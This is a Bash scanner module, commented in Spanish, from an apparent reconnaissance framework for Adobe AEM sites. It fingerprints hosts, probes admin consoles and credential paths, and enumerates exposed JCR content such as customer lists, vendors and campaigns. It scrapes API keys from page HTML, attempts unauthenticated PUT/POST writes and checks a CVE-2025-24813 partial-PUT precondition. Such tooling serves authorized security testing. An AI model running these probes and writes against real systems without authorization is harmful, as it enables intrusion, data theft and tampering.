#!/usr/bin/env bash
# ============================================================
#  modules/37_aem_jcr_scan.sh
#  Fase 37: AEM JCR Deep Exposure Scanner
#
#  Técnicas descubiertas durante el audit de workday.com (2026-05):
#    1. Fingerprint AEM sin paths admin (jcr:content.json oracle)
#    2. JCR tree exposure vía Sling selectors:
#         .ext.json          → child listing con tipos
#         .childrenlist.json → child listing alternativo
#         jcr:content.json   → propiedades completas del nodo
#         .api.json          → oracle: 400=existe, blocked=dispatcher
#         .tidy.json / .lit.json → variantes de export
#    3. Content Fragment enumeration:
#         /content/dam/fragments/customers/ → base de clientes
#         /content/dam/fragments/customer-stories/ → video IDs gated
#         /content/dam/fragments/forms/ → metadata gated content
#    4. DAM/EDAM marketing intelligence:
#         /content/dam/edam/ → vendors, FY campaigns, personas
#    5. Staging env en producción (/.childrenlist.json → qa-vd, etc.)
#    6. jcr:content properties → UUID, template paths, timestamps,
#         ContextHub paths, component resource types (fingerprinting)
#    7. Credentials en HTML renderizado:
#         Coveo static API key (prefijo xx, no-expiring)
#         Adobe Launch/AEP Datastream IDs
#         window.endPointsConfig (user mgmt APIs, Lambda names)
#    8. Métodos de escritura contra JCR (PUT/POST/DELETE/PATCH)
#    9. CVE-2025-24813 Tomcat partial PUT pre-condition check
#         (Content-Range PUT → 409 = partial PUT enabled)
#   10. Rutas admin AEM sin Dispatcher (crx/de, system/console,
#         /bin/querybuilder, /libs/granite/core/content/login)
#
#  Activación: siempre se intenta fingerprint; solo profundiza
#  si AEM confirmado. Compatible con Dispatcher delante (CloudFront).
#
#  Severidades:
#    critical → crx/de accesible, system/console, querybuilder
#    high     → customer DB expuesta, CVE-2025-24813 partial PUT
#    medium   → EDAM/vendor intel, jcr:content, staging env, HTML creds
#    low      → component tree, aem65test, version disclosure
# ============================================================

MODULE_NAME="aem_jcr_scan"
MODULE_DESC="AEM JCR Deep Exposure Scanner (Sling selectors + DAM + CVE-2025-24813)"

# ── Timeouts ──────────────────────────────────────────────────
_AEM_CURL_TO=12
_AEM_CURL_MAX=18

# ── HTTP helpers via wrappers core/http_analyzer.sh ──────────
# Los wrappers _h_* respetan rate-limit global, dead-URL cache y
# auto-inyección de proxy. Aquí mantenemos la firma original
# (echo de body o status) para no tocar los ~40 callers.
_aem_get() {
  local URL="$1"
  HTTP_TIMEOUT="$_AEM_CURL_MAX" \
    _h_get "$URL" --connect-timeout "$_AEM_CURL_TO"
  echo "$HTTP_LAST_BODY"
}

_aem_code() {
  local URL="$1"
  HTTP_TIMEOUT="$_AEM_CURL_MAX" \
    _h_status "$URL" --connect-timeout "$_AEM_CURL_TO"
}

_aem_code_noredirect() {
  local URL="$1"
  HTTP_TIMEOUT="$_AEM_CURL_MAX" \
    _h_status_noredirect "$URL" --connect-timeout "$_AEM_CURL_TO"
}

# ── Detectar si un host tiene AEM ────────────────────────────
# Retorna 0 si AEM confirmado, 1 si no
_aem_fingerprint() {
  local BASE="$1"   # https://host

  # 1. jcr:content.json en paths comunes → respuesta JSON con jcr:uuid
  local JCR_TEST
  for p in "/en-us/jcr:content.json" "/en/jcr:content.json" \
            "/content/jcr:content.json" "/home/jcr:content.json" \
            "/index/jcr:content.json"; do
    JCR_TEST=$(_aem_get "${BASE}${p}")
    if echo "$JCR_TEST" | grep -q '"jcr:uuid"\|sling:resourceType\|cq:template'; then
      return 0
    fi
  done

  # 2. .ext.json en root o /content
  local EXT_TEST
  for p in "/.ext.json" "/.childrenlist.json" "/content.ext.json"; do
    EXT_TEST=$(_aem_get "${BASE}${p}")
    if echo "$EXT_TEST" | grep -q '"jcr:primaryType"\|cq:Page\|dam:Asset'; then
      return 0
    fi
  done

  # 3. X-Content-Type-Options / Server header con Adobe/AEM
  _h_head "$BASE/"
  if echo "$HTTP_LAST_HEADERS" | grep -qi "adobe\|aem\|cq5\|day-servlet\|sling"; then
    return 0
  fi

  # 4. Paths admin clásicos (sin Dispatcher: 200/302; con Dispatcher: 404)
  for p in "/libs/granite/core/content/login.html" \
            "/crx/de/index.jsp" "/system/console/bundles"; do
    local CODE
    CODE=$(_aem_code "${BASE}${p}")
    if [[ "$CODE" == "200" || "$CODE" == "302" || "$CODE" == "401" ]]; then
      return 0
    fi
  done

  return 1
}

# ── Comprobar si un selector JCR devuelve datos reales ────────
_aem_selector_works() {
  local URL="$1"
  local BODY
  BODY=$(_aem_get "$URL")
  local CODE
  CODE=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    # Si tiene al menos una key interesante de JCR
    keys = set(d.keys()) if isinstance(d, dict) else set()
    jcr_keys = {'jcr:primaryType','jcr:uuid','jcr:title','sling:resourceType','cq:template','jcr:created'}
    print('ok' if jcr_keys & keys or (isinstance(d, list) and len(d) > 0) else 'empty')
except:
    print('empty')
" 2>/dev/null)
  [[ "$CODE" == "ok" ]]
}

# ── Finding helper ────────────────────────────────────────────
_aem_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" TARGET="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6"

  local EXISTS
  EXISTS=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID}
       AND target='${TARGET//\'/\'\'}' AND type='${TYPE}';" 2>/dev/null || echo "1")
  [[ "${EXISTS:-1}" != "0" ]] && return

  db_add_finding "$DOMAIN_ID" "$TYPE" "$SEV" "$TARGET" "aem_jcr" "$DETAIL"

  local ICON="🔍"
  case "$SEV" in
    critical) ICON="🔴" ;;
    high)     ICON="🟠" ;;
    medium)   ICON="🟡" ;;
    low)      ICON="🔵" ;;
  esac

  local TG_MSG="${ICON} *AEM: ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${TARGET}\`
📋 Severidad: \`${SEV^^}\`
📝 ${DETAIL:0:300}
📅 $(date '+%Y-%m-%d %H:%M:%S')"

  _telegram_send "$TG_MSG" 2>/dev/null || true
  log_warn "  [aem_jcr] ${SEV^^} — ${TYPE}: ${TARGET}"
}

# ── 1. Rutas admin AEM (crx/de, system/console, querybuilder) ─
_aem_check_admin_paths() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local ADMIN_PATHS=(
    "/crx/de/index.jsp"
    "/crx/explorer/index.jsp"
    "/crx/packmgr/index.jsp"
    "/system/console/bundles"
    "/system/console/configMgr"
    "/system/console/users"
    "/bin/querybuilder.json"
    "/bin/wcm/search"
    "/libs/granite/core/content/login.html"
    "/libs/cq/search/content/querydebug.html"
    "/etc/passwd.json"
    "/etc/replication.agents.publish.json"
    "/etc/replication.agents.author.json"
  )

  for P in "${ADMIN_PATHS[@]}"; do
    local CODE
    CODE=$(_aem_code_noredirect "${BASE}${P}")
    if [[ "$CODE" == "200" || "$CODE" == "302" || "$CODE" == "401" ]]; then
      local SEV="medium"
      [[ "$P" =~ crx/de|system/console|querybuilder|passwd ]] && SEV="critical"
      [[ "$P" =~ login ]] && SEV="low"
      [[ "$CODE" == "401" ]] && SEV="low"  # existe pero requiere auth
      _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${P}" \
        "aem_admin_path" "$SEV" \
        "AEM admin path accesible (HTTP ${CODE}): ${P}"
    fi
  done
}

# ── 2. JCR selector oracle + version disclosure ───────────────
_aem_check_jcr_selectors() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # Verificar que al menos un selector JCR funciona
  local WORKS=false
  local WORKING_PATH=""
  local WORKING_SEL=""

  # Paths de página + selectores a probar
  local PATHS=("/en-us" "/en" "/content" "/home" "/index" "")
  local SELS=("jcr:content.json" ".ext.json" ".childrenlist.json")

  for P in "${PATHS[@]}"; do
    for S in "${SELS[@]}"; do
      local URL="${BASE}${P}/${S}"
      [[ -z "$P" ]] && URL="${BASE}/${S}"
      local CODE
      CODE=$(_aem_code "$URL")
      if [[ "$CODE" == "200" ]]; then
        local BODY
        BODY=$(_aem_get "$URL")
        if echo "$BODY" | grep -q 'jcr:\|sling:\|cq:'; then
          WORKS=true
          WORKING_PATH="$P"
          WORKING_SEL="$S"
          break 2
        fi
      fi
    done
  done

  $WORKS || return 1

  # Extraer version/template info del jcr:content
  local JCR_BODY
  JCR_BODY=$(_aem_get "${BASE}${WORKING_PATH}/jcr:content.json" 2>/dev/null || echo "")
  [[ -z "$JCR_BODY" ]] && JCR_BODY=$(_aem_get "${BASE}${WORKING_PATH}/en-us/jcr:content.json" 2>/dev/null || echo "")

  local TEMPLATE UUID RESOURCE_TYPE LAST_REP
  TEMPLATE=$(echo "$JCR_BODY"       | python3 -c "import sys,json; d=json.loads(sys.stdin.read() or '{}'); print(d.get('cq:template',''))" 2>/dev/null || echo "")
  UUID=$(echo "$JCR_BODY"           | python3 -c "import sys,json; d=json.loads(sys.stdin.read() or '{}'); print(d.get('jcr:uuid',''))" 2>/dev/null || echo "")
  RESOURCE_TYPE=$(echo "$JCR_BODY"  | python3 -c "import sys,json; d=json.loads(sys.stdin.read() or '{}'); print(d.get('sling:resourceType',''))" 2>/dev/null || echo "")
  LAST_REP=$(echo "$JCR_BODY"       | python3 -c "import sys,json; d=json.loads(sys.stdin.read() or '{}'); print(d.get('cq:lastReplicated',''))" 2>/dev/null || echo "")

  local DETAIL="JCR selector expuesto: ${WORKING_SEL}"
  [[ -n "$TEMPLATE"      ]] && DETAIL+=" | template: ${TEMPLATE}"
  [[ -n "$RESOURCE_TYPE" ]] && DETAIL+=" | resourceType: ${RESOURCE_TYPE}"
  [[ -n "$LAST_REP"      ]] && DETAIL+=" | lastReplicated: ${LAST_REP}"
  [[ -n "$UUID"          ]] && DETAIL+=" | uuid: ${UUID}"

  _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${WORKING_PATH}/${WORKING_SEL}" \
    "aem_jcr_exposed" "medium" "$DETAIL"

  # Devolver indicación de que JCR está expuesto
  return 0
}

# ── 3. Content Fragment enumeration ──────────────────────────
_aem_check_content_fragments() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # Comprobar raíz fragments
  local ROOT_CODE
  ROOT_CODE=$(_aem_code "${BASE}/content/dam/fragments.ext.json")
  [[ "$ROOT_CODE" != "200" ]] && return

  local ROOT_BODY
  ROOT_BODY=$(_aem_get "${BASE}/content/dam/fragments.ext.json")

  # Encontrar subcarpetas expuestas
  local EXPOSED_FOLDERS
  EXPOSED_FOLDERS=$(echo "$ROOT_BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    if isinstance(d, list):
        for item in d:
            if isinstance(item, dict) and item.get('name'):
                print(item['name'])
    elif isinstance(d, dict):
        for k in d:
            if not k.startswith('jcr:') and not k.startswith('sling:'):
                print(k)
except: pass
" 2>/dev/null || echo "")

  local TOTAL_CUSTOMERS=0
  local FOUND_INTEL=()

  # Customers DB
  if echo "$ROOT_BODY" | grep -q "customers"; then
    local CUST_TOTAL=0
    for SECT in "a-h" "i-p" "q-z"; do
      local URL="${BASE}/content/dam/fragments/customers/en-us/${SECT}.ext.json"
      local CODE BODY COUNT
      CODE=$(_aem_code "$URL")
      if [[ "$CODE" == "200" ]]; then
        BODY=$(_aem_get "$URL")
        COUNT=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    items = d if isinstance(d, list) else list(d.values()) if isinstance(d, dict) else []
    print(len([x for x in items if isinstance(x, dict) and x.get('text')]))
except: print(0)
" 2>/dev/null || echo "0")
        CUST_TOTAL=$((CUST_TOTAL + COUNT))
      fi
    done
    if [[ "$CUST_TOTAL" -gt 0 ]]; then
      FOUND_INTEL+=("customer_db:${CUST_TOTAL}")
      _aem_finding "$DOMAIN_ID" "$DOMAIN" \
        "${BASE}/content/dam/fragments/customers/" \
        "aem_customer_db" "high" \
        "Customer database expuesta sin autenticación: ${CUST_TOTAL} empresas en /content/dam/fragments/customers/en-us/{a-h,i-p,q-z}.ext.json"
    fi
  fi

  # Customer stories + Brightcove video IDs
  if echo "$ROOT_BODY" | grep -q "customer-stories"; then
    local STORY_CODE
    STORY_CODE=$(_aem_code "${BASE}/content/dam/fragments/customer-stories.ext.json")
    if [[ "$STORY_CODE" == "200" ]]; then
      # Probar una entry conocida para confirmar video IDs
      local STORY_BODY
      STORY_BODY=$(_aem_get "${BASE}/content/dam/fragments/customer-stories/en-us/a-h.ext.json")
      if echo "$STORY_BODY" | grep -q 'brightcove\|ctaURL\|mp4'; then
        local BC_ACCOUNT
        BC_ACCOUNT=$(echo "$STORY_BODY" | grep -oP 'brightcove_assets/\K[0-9]+' | head -1 || echo "")
        FOUND_INTEL+=("brightcove_ids")
        _aem_finding "$DOMAIN_ID" "$DOMAIN" \
          "${BASE}/content/dam/fragments/customer-stories/" \
          "aem_brightcove_exposure" "medium" \
          "Brightcove video IDs expuestos en customer story fragments — bypass de lead-gen gating${BC_ACCOUNT:+ | account: $BC_ACCOUNT}"
      fi
    fi
  fi

  # Forms / gated content metadata
  if echo "$ROOT_BODY" | grep -q "forms"; then
    local FORMS_BODY
    FORMS_BODY=$(_aem_get "${BASE}/content/dam/fragments/forms.ext.json")
    if echo "$FORMS_BODY" | grep -q "aem65test\|gated\|isGated"; then
      _aem_finding "$DOMAIN_ID" "$DOMAIN" \
        "${BASE}/content/dam/fragments/forms/" \
        "aem_gated_metadata" "low" \
        "Metadata de contenido gated expuesta (aem65test folder detectado → AEM 6.5 on-premise confirmado)"
    fi
  fi

  # Locales adicionales (confirman scope del leak)
  local LOCALES="ae au be de en-ca es fr hk in it ja ko mx nl pl"
  local EXTRA_LOCALES=0
  for LOC in $LOCALES; do
    local LOC_CODE
    LOC_CODE=$(_aem_code "${BASE}/content/dam/fragments/customers/${LOC}.ext.json")
    [[ "$LOC_CODE" == "200" ]] && EXTRA_LOCALES=$((EXTRA_LOCALES + 1))
    [[ "$EXTRA_LOCALES" -ge 3 ]] && break  # suficiente para confirmar
  done
  if [[ "$EXTRA_LOCALES" -gt 0 ]]; then
    log_info "  [aem_jcr] Customer DB en ${EXTRA_LOCALES}+ locales adicionales"
  fi
}

# ── 4. EDAM marketing intelligence ───────────────────────────
_aem_check_edam() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local EDAM_CODE
  EDAM_CODE=$(_aem_code "${BASE}/content/dam/edam.ext.json")
  [[ "$EDAM_CODE" != "200" ]] && return

  local EDAM_BODY
  EDAM_BODY=$(_aem_get "${BASE}/content/dam/edam.ext.json")
  echo "$EDAM_BODY" | grep -q 'agency-vendor\|demand-gen\|brand\|corporate' || return

  # Vendors
  local VENDOR_BODY
  VENDOR_BODY=$(_aem_get "${BASE}/content/dam/edam/agency-vendor.ext.json")
  local VENDORS
  VENDORS=$(echo "$VENDOR_BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    items = d if isinstance(d, list) else list(d.keys()) if isinstance(d, dict) else []
    vendors = [x for x in items if isinstance(x, str) and not x.startswith('jcr:') and not x.startswith('sling:')]
    print(', '.join(vendors[:10]))
except: print('')
" 2>/dev/null || echo "")

  # FY future campaigns
  local FY_FOUND=""
  for FY in "fy27" "fy26" "fy28" "fy25"; do
    local FY_CODE
    FY_CODE=$(_aem_code "${BASE}/content/dam/edam/demand-gen/${FY}.ext.json")
    if [[ "$FY_CODE" == "200" ]]; then
      FY_FOUND="$FY"
      break
    fi
  done

  local DETAIL="Enterprise DAM expuesto: /content/dam/edam/"
  [[ -n "$VENDORS" ]] && DETAIL+=" | Vendors/agencias: ${VENDORS}"
  [[ -n "$FY_FOUND" ]] && DETAIL+=" | Future campaign planning: ${FY_FOUND^^} campaigns accesibles"

  _aem_finding "$DOMAIN_ID" "$DOMAIN" \
    "${BASE}/content/dam/edam/" \
    "aem_edam_exposure" "medium" "$DETAIL"
}

# ── 5. Staging env en producción (/.childrenlist.json) ────────
_aem_check_staging() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local ROOT_BODY
  ROOT_BODY=$(_aem_get "${BASE}/.childrenlist.json")
  echo "$ROOT_BODY" | grep -q 'qa\|staging\|test\|dev\|preprod\|uat' || return

  local STAGING_NODES
  STAGING_NODES=$(echo "$ROOT_BODY" | python3 -c "
import sys, json, re
try:
    d = json.loads(sys.stdin.read())
    items = d if isinstance(d, list) else list(d.keys()) if isinstance(d, dict) else []
    pattern = re.compile(r'qa|staging|test|dev|preprod|uat', re.IGNORECASE)
    found = [str(x) for x in items if pattern.search(str(x))]
    print(', '.join(found[:10]))
except: print('')
" 2>/dev/null || echo "qa/staging node")

  _aem_finding "$DOMAIN_ID" "$DOMAIN" \
    "${BASE}/.childrenlist.json" \
    "aem_staging_exposure" "medium" \
    "Entorno staging/QA expuesto en producción vía /.childrenlist.json: ${STAGING_NODES}"
}

# ── 6. Credentials en HTML renderizado ───────────────────────
_aem_check_html_creds() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # Fetch homepage
  local HTML
  HTML=$(_aem_get "${BASE}/")
  [[ -z "$HTML" ]] && return

  local FOUND_CREDS=()

  # Coveo static API key (prefijo xx → no expiring)
  local COVEO_KEY COVEO_ORG
  COVEO_KEY=$(echo "$HTML" | grep -oP 'data-token="xx[a-f0-9\-]{30,}"' | \
    grep -oP '"xx[^"]+' | tr -d '"' | head -1 || echo "")
  COVEO_ORG=$(echo "$HTML" | grep -oP 'data-org-id="[^"]+"' | \
    grep -oP '"[^"]+$' | tr -d '"' | head -1 || echo "")

  if [[ -n "$COVEO_KEY" ]]; then
    FOUND_CREDS+=("coveo_api_key: ${COVEO_KEY}")
    _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/" \
      "aem_coveo_key" "medium" \
      "Coveo static API key (prefijo 'xx', no-expiring) expuesta en HTML: ${COVEO_KEY}${COVEO_ORG:+ | org: $COVEO_ORG}"
  fi

  # Adobe Launch property ID
  local LAUNCH_ID
  LAUNCH_ID=$(echo "$HTML" | grep -oP 'launch-EN[a-f0-9]{32}' | head -1 || echo "")
  [[ -z "$LAUNCH_ID" ]] && \
    LAUNCH_ID=$(echo "$HTML" | grep -oP 'EN[a-f0-9]{32}' | head -1 || echo "")

  # Adobe Org ID
  local ADOBE_ORG
  ADOBE_ORG=$(echo "$HTML" | grep -oP '[A-Z0-9]{24}@AdobeOrg' | head -1 || echo "")

  if [[ -n "$LAUNCH_ID" || -n "$ADOBE_ORG" ]]; then
    local ADOBE_DETAIL="Adobe Experience Cloud identifiers en HTML"
    [[ -n "$LAUNCH_ID"  ]] && ADOBE_DETAIL+=" | Launch: ${LAUNCH_ID}"
    [[ -n "$ADOBE_ORG"  ]] && ADOBE_DETAIL+=" | Org: ${ADOBE_ORG}"
    FOUND_CREDS+=("adobe_org: ${ADOBE_ORG:-unknown}")
    _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/" \
      "aem_adobe_identifiers" "low" "$ADOBE_DETAIL"
  fi

  # window.endPointsConfig → internal APIs + Lambda names
  local ENDPOINT_CONFIG
  ENDPOINT_CONFIG=$(echo "$HTML" | grep -oP 'endPointsConfig\s*=\s*\{[^}]+\}' | head -1 || echo "")
  if [[ -z "$ENDPOINT_CONFIG" ]]; then
    # Probar en 404 page
    local PAGE_404
    PAGE_404=$(_aem_get "${BASE}/___nonexistent_hackeadora_probe___")
    ENDPOINT_CONFIG=$(echo "$PAGE_404" | grep -oP 'endPointsConfig\s*=\s*\{[^}]+\}' | head -1 || echo "")
  fi

  if [[ -n "$ENDPOINT_CONFIG" ]]; then
    local INTERNAL_APIS
    INTERNAL_APIS=$(echo "$ENDPOINT_CONFIG" | grep -oP 'https?://[^"\\]+' | head -5 | tr '\n' ' ')
    _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/" \
      "aem_internal_api_disclosure" "medium" \
      "window.endPointsConfig expone APIs internas: ${INTERNAL_APIS}"
  fi

  # Lambda / function names en 500 errors
  local LAMBDA_URLS
  LAMBDA_URLS=$(echo "$HTML $ENDPOINT_CONFIG" | \
    grep -oP 'https?://[a-z0-9\-]+\.(mktg|digital|internal)\.[a-z]+\.[a-z]+/[^\s"]+' | \
    head -5 | tr '\n' ' ' || echo "")

  if [[ -n "$LAMBDA_URLS" ]]; then
    for LURL in $LAMBDA_URLS; do
      local RESP
      RESP=$(_aem_get "$LURL")
      if echo "$RESP" | grep -qiE '"function"\s*:\s*"[A-Za-z0-9\-]+-Prod"'; then
        local FN_NAME
        FN_NAME=$(echo "$RESP" | grep -oP '"function"\s*:\s*"\K[^"]+' | head -1)
        _aem_finding "$DOMAIN_ID" "$DOMAIN" "$LURL" \
          "aem_lambda_disclosure" "medium" \
          "Lambda function name expuesto en error 500: ${FN_NAME} | URL: ${LURL}"
      fi
    done
  fi
}

# ── 7. Write methods test ─────────────────────────────────────
_aem_check_write() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local TEST_PATHS=(
    "/content/hackeadora_write_test"
    "/content/dam/hackeadora_test"
    "/tmp/hackeadora_test"
  )

  for P in "${TEST_PATHS[@]}"; do
    for METHOD in PUT POST; do
      # _noredirect: Bug #9 — evitar que un 30x se siga y devuelva 200 falso
      _h_method_noredirect "$METHOD" "${BASE}${P}" \
        --connect-timeout 8 \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "jcr:primaryType=nt:unstructured&jcr:title=test"
      local CODE="$HTTP_LAST_STATUS"

      # 200/201 = escritura exitosa (crítico), 409 = conflicto (podría indicar escritura parcial)
      if [[ "$CODE" == "200" || "$CODE" == "201" ]]; then
        _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${P}" \
          "aem_jcr_write" "critical" \
          "JCR write via ${METHOD} exitoso (HTTP ${CODE}): escritura sin autenticación en ${P}"
        # Intentar limpiar
        _h_method_noredirect "DELETE" "${BASE}${P}" --connect-timeout 8 2>/dev/null || true
        break 2
      fi
    done
  done
}

# ── 8. CVE-2025-24813 — Tomcat partial PUT pre-condition ──────
# AEM 6.5 corre sobre Apache Tomcat. Si DefaultServlet tiene
# readonly=false, PUT con Content-Range crea sesiones parciales
# que luego se pueden deserializar vía JSESSIONID cookie.
# Este check SOLO verifica si la pre-condición existe (409 = acepta
# partial PUT) SIN ejecutar el payload de deserialización.
_aem_check_cve_2025_24813() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local TAG="hckd_$(date +%s)_test"
  local PUT_URL="${BASE}/${TAG}/session"

  # PUT con Content-Range → 409 indica partial PUT aceptado
  # _noredirect: Bug #9 — un 30x con -L falsifica 200/204
  _h_method_noredirect "PUT" "$PUT_URL" \
    --connect-timeout 8 \
    -H "Content-Length: 100" \
    -H "Content-Range: bytes 0-50/200" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "HACKEADORA_PROBE_$(date +%s)"
  local PUT_CODE="$HTTP_LAST_STATUS"

  if [[ "$PUT_CODE" == "409" ]]; then
    _aem_finding "$DOMAIN_ID" "$DOMAIN" "$PUT_URL" \
      "cve_2025_24813_partial_put" "high" \
      "CVE-2025-24813 pre-condition: Tomcat partial PUT aceptado (HTTP 409) en ${PUT_URL} — DefaultServlet readonly=false — confirmar deserialización antes de reportar"
  elif [[ "$PUT_CODE" == "204" || "$PUT_CODE" == "201" ]]; then
    _aem_finding "$DOMAIN_ID" "$DOMAIN" "$PUT_URL" \
      "cve_2025_24813_write_enabled" "critical" \
      "CVE-2025-24813: Tomcat DefaultServlet write ENABLED (HTTP ${PUT_CODE}) — PUT sin autenticación aceptado en ${PUT_URL}"
    # Intentar limpiar
    _h_method_noredirect "DELETE" "$PUT_URL" --connect-timeout 8 2>/dev/null || true
  fi
  # 403/405 = DefaultServlet readonly=true (not vulnerable) → no reporting
}

# ── 9. Deep JCR component tree ────────────────────────────────
_aem_check_deep_traversal() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3"

  local DEEP_PATHS=(
    "/en-us/homepage/jcr:content/root/responsivegrid.ext.json"
    "/en-us/search/jcr:content/root/responsivegrid.ext.json"
    "/en/homepage/jcr:content/root/responsivegrid.ext.json"
    "/home/jcr:content/root/responsivegrid.ext.json"
  )

  for P in "${DEEP_PATHS[@]}"; do
    local CODE BODY
    CODE=$(_aem_code "${BASE}${P}")
    if [[ "$CODE" == "200" ]]; then
      BODY=$(_aem_get "${BASE}${P}")
      if echo "$BODY" | grep -q 'jcr:primaryType\|sling:resourceType'; then
        local COMPONENTS
        COMPONENTS=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    comps = []
    for k, v in (d.items() if isinstance(d, dict) else []):
        if isinstance(v, dict) and 'sling:resourceType' in v:
            comps.append(f\"{k}: {v['sling:resourceType']}\")
    print(' | '.join(comps[:5]))
except: print('')
" 2>/dev/null || echo "")
        _aem_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${P}" \
          "aem_deep_jcr_traversal" "low" \
          "Deep JCR component tree accesible: ${P}${COMPONENTS:+ | components: $COMPONENTS}"
        break  # un ejemplo es suficiente
      fi
    fi
  done
}

# ── module_run ────────────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 37 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true

  # Construir lista de candidatos
  local CANDIDATES=()

  # 1. Target directo (puede ser dominio raíz o subdominio)
  CANDIDATES+=("https://${DOMAIN}")

  # 2. Subdominios alive con indicios de AEM en tech DB
  local AEM_SUBS
  AEM_SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT s.subdomain
     FROM subdomains s
     LEFT JOIN technologies t ON s.domain_id = t.domain_id AND s.subdomain = t.subdomain
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND (
         t.tech_name LIKE '%AEM%'   OR t.tech_name LIKE '%Adobe Experience%'
         OR t.tech_name LIKE '%Sling%' OR t.tech_name LIKE '%CQ5%'
         OR t.tech_name LIKE '%Day%'
       );" 2>/dev/null || echo "")

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    CANDIDATES+=("https://${SUB}")
  done <<< "$AEM_SUBS"

  # 3. Subdominios con "aem", "cms", "content", "www" en el nombre
  local NAMED_SUBS
  NAMED_SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive'
       AND (subdomain LIKE 'aem.%' OR subdomain LIKE 'cms.%'
            OR subdomain LIKE 'content.%' OR subdomain LIKE 'www.%'
            OR subdomain LIKE 'author.%' OR subdomain LIKE 'publish.%');" \
    2>/dev/null || echo "")

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local URL="https://${SUB}"
    # Evitar duplicados
    [[ " ${CANDIDATES[*]} " =~ " ${URL} " ]] || CANDIDATES+=("$URL")
  done <<< "$NAMED_SUBS"

  # Deduplicar
  local UNIQUE_CANDS=()
  declare -A _SEEN_AEM
  for C in "${CANDIDATES[@]}"; do
    [[ -z "$C" ]] && continue
    if [[ -z "${_SEEN_AEM[$C]+x}" ]]; then
      _SEEN_AEM[$C]=1
      UNIQUE_CANDS+=("$C")
    fi
  done

  local TOTAL=${#UNIQUE_CANDS[@]}
  log_info "Candidatos AEM a probar: $TOTAL"

  local AEM_CONFIRMED=0

  for BASE in "${UNIQUE_CANDS[@]}"; do
    log_info "  [aem_jcr] Fingerprinting: $BASE"

    # Fingerprint — si no es AEM, skip
    if ! _aem_fingerprint "$BASE"; then
      log_info "  [aem_jcr] No AEM detectado en: $BASE"
      continue
    fi

    log_warn "  [aem_jcr] AEM CONFIRMADO: $BASE — iniciando deep scan"
    AEM_CONFIRMED=$((AEM_CONFIRMED + 1))

    # Ejecutar todos los checks en paralelo por host
    _aem_check_admin_paths    "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_jcr_selectors  "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_content_fragments "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_edam           "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_staging        "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_html_creds     "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_deep_traversal "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_write          "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    _aem_check_cve_2025_24813 "$BASE" "$DOMAIN_ID" "$DOMAIN" &
    wait

  done

  local FOUND
  FOUND=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID}
       AND type LIKE 'aem_%' OR type='cve_2025_24813%';" \
    2>/dev/null || echo 0)

  if [[ "$AEM_CONFIRMED" -eq 0 ]]; then
    log_ok "$MODULE_DESC: no se detectó AEM en ${TOTAL} candidatos"
  else
    log_ok "$MODULE_DESC completado: ${AEM_CONFIRMED} instancias AEM, ${FOUND} findings"
  fi
}
